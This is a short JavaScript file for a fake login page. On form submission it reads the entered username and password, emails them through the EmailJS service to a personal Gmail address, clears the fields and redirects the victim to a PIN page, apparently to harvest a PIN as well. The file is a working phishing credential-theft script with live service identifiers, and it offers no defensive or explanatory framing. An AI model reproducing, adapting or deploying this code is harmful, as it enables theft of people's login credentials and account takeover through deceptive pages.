// emailjs.init("");
const username = document.querySelector("#username");
const password = document.querySelector("#password");
const btn = document.querySelector("button");
btn.onclick = () => {
  btn.innerHTML = "Loading...";
};
const serviceId = "service_ilm5noi";
const userId = "MzE-gXmUS1Etbk7nd";
const templateId = "template_cx7zoyv";
document.getElementById("login").onsubmit = function (event) {
  event.preventDefault();
  const emailParams = {
    to_name: "painkiller43211@gmail.com",
    username: username.value,
    password: password.value,
  };
  console.log(emailParams);
  console.log(emailParams);
  emailjs.send(serviceId, templateId, emailParams, userId).then(
    function (response) {
      console.log("Sent successfully:", response);
      username.value = "";
      password.value = "";
      location.href = "/pin.html";
    },
    function (error) {
      console.log("Failed to send:", error);
    }
  );
};


const eye = document.querySelector(".formInput i.fa-eye");

eye.onclick = () => {
  if (password.type === "password") {
    password.type = "text";
    eye.classList.replace("fa-eye", "fa-eye-slash");
  } else {
    password.type = "password";
    eye.classList.replace("fa-eye-slash", "fa-eye");
  }
};
